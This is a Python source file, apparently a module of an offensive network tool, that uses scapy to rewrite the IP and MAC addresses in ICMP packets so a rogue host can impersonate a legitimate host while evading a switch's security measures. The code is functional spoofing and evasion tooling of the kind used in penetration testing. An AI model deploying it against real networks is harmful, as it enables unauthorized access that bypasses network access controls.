# coding=utf-8
######################################################################
##|# ------- modICMP : ICMP management module for MANGLE ------- #|###
##|# -  It is responsible for handling ICMP messages in order  - #|###
##|# -  to avoid triggering switch's security measures while   - #|###
##|# -           still providing ICMP possibilities            - #|###
##|# -          to both the legitimate and rogue host          - #|###
######################################################################

from scapy.all import *
from FenrirTail import FenrirTail


###################################################################
### ---------------- Main component of modICMP ---------------- ####
###################################################################
class modICMP :

	def __init__(self, ip_host, ip_rogue, mac_host, mac_rogue, debugLevel=1) :
		self.FenrirTail = FenrirTail(debugLevel)
		self.debugLevel = debugLevel
		self.FenrirTail.notify('Loading ICMP module...', 1)
		self.ICMPthreads = []
		self.ICMPthread_number = 0
		self.host = ip_host
		self.rogue = ip_rogue
		self.mrogue = mac_rogue
		self.mhost = mac_host
		self.requestTypes = [8, 13, 15, 17]


	## modICMP main routine ##
	def Fenrir_Control_Message_Protocol(self, ICMPpkt) :
		if ICMPpkt[ICMP].type in self.requestTypes :  # request
			self.FenrirTail.notify('ICMP request received', 3)
			if ICMPpkt[Ether].src == self.mrogue or ICMPpkt[Ether].src == self.mhost :
				self.FenrirTail.notify('Request from rogue or host, mangling...', 3)
				new_ICMPthread = self.createICMPthread(ICMPpkt)
				return self.ICMPRequestMangling(ICMPpkt)
			elif ICMPpkt[Ether].dst == self.mhost :
				self.FenrirTail.notify('Request for host, forwarding...', 3)
				return ICMPpkt # if request for host, then forward
			else :
				return False  # drop pkt
		else :  # reply
			self.FenrirTail.notify('ICMP reply received', 3)
			for ICMPthread in self.ICMPthreads :
				if ICMPthread.thisIsMyICMP(ICMPpkt) :
					self.FenrirTail.notify('Corresponding ICMPthread found', 3)
					ICMPthread.state = 'rep_rcvd'
					returnedPkt = self.ICMPReplyMangling(ICMPpkt, ICMPthread)
					self.deleteICMPthread(ICMPthread)
					return returnedPkt
			self.FenrirTail.notify('No corresponding ICMPthread found', 3)
			return ICMPpkt # if no ICMPthread, then forward the ARP-reply


	## Creation of new ICMPthread, returns an ICMPthread ##
	def createICMPthread(self, pkt) :
		self.ICMPthread_number += 1
		ICMPthread_instance = ICMPthread(pkt[Ether].src, pkt[Ether].dst, pkt[IP].src, pkt[IP].dst, "req_sent")
		self.ICMPthreads.append(ICMPthread_instance)
		self.FenrirTail.notify('New ICMPthread created', 3)
		return ICMPthread_instance


	## Deletion of complete ICMPthread ##
	def deleteICMPthread(self, ICMPthread) :
		try :
			self.ICMPthreads.remove(ICMPthread)
			self.ICMPthread_number -= 1
			self.FenrirTail.notify('ICMPthread deleted', 3)
			return True
		except ValueError :
			self.FenrirTail.fenrirPanic('Unexpected exception was raised during deletion of ICMPthread')


	## Mangling functions, return mangled packets ##
	def ICMPRequestMangling(self, pkt) :
		if pkt[Ether].src == self.mrogue :  # packet from rogue
			return self.pktRewriter(pkt, self.host, 0, self.mhost, 0)
		elif pkt[Ether].src == self.mhost :  # packet from host - no need for mangling
			self.FenrirTail.notify('ICMP Request from host to network - FORWARD', 2)
			return pkt
		else :
			self.FenrirTail.fenrirPanic('NOT YET IMPLEMENTED (ICMP request from network)')


	def ICMPReplyMangling(self, pkt, ICMPthread) :
		if ICMPthread.src_mac == self.mrogue :  # packet for rogue
			return self.pktRewriter(pkt, 0, self.rogue, 0, self.mrogue)
		elif ICMPthread.src_mac == self.mhost :  # packet for host no need for mangling
			self.FenrirTail.notify('ICMP Request from network to host - FORWARD', 2)
			return pkt
		else :
			self.FenrirTail.fenrirPanic('NOT YET IMPLEMENTED (ICMP reply from network)')


	## Rewrites ICMP packets ##
	def pktRewriter(self, pkt, src, dst, msrc, mdst) :
		self.FenrirTail.notify('ICMP packet is being rewritten :', 3)
		if src != 0 :
			self.FenrirTail.notify('\t' + pkt[IP].src + ' --> ' + src, 3)
			pkt[IP].src = src
		if dst != 0 :
			self.FenrirTail.notify('\t' + pkt[IP].dst + ' --> ' + dst, 3)
			pkt[IP].dst = dst
		if msrc != 0 :
			self.FenrirTail.notify('\t' + pkt[Ether].src + ' --> ' + msrc, 3)
			pkt[Ether].src = msrc
		if mdst != 0 :
			self.FenrirTail.notify('\t' + pkt[Ether].dst + ' --> ' + mdst, 3)
			pkt[Ether].dst = mdst
		del pkt[ICMP].chksum
		del pkt[IP].chksum
		pkt = pkt.__class__(str(pkt))
		self.FenrirTail.notify('ICMP packet mangled and rewritten successfully', 3)
		return pkt





###################################################################
### --- Class representing an ARP exchange between 2 hosts --- ####
###################################################################
class ICMPthread :
	states = ['req_sent', 'rep_rcvd', 'zombie']

	#SOURCE is always from the host point of view (spoofed/rogue host)
	def __init__(self, msrc, mdst, asrc, adst, state = "req_sent") :
		self.src_mac = msrc
		self.src_ip = asrc
		self.dst_mac = mdst
		self.dst_ip = adst
		self.state = state


	## Returns True if a packet is a reply to a previous request
	def thisIsMyICMP(self, pkt) :
		if pkt[Ether].src == self.dst_mac and pkt[IP].src == self.dst_ip :
			return True
		else :
			return False


	## Debugging functions ##
	def dump(self) :
		print 'src_mac = \t' + self.src_mac
		print 'src_ip = \t' + self.src_ip
		print 'dst_mac = \t' + self.dst_mac
		print 'dst_ip = \t' + self.dst_ip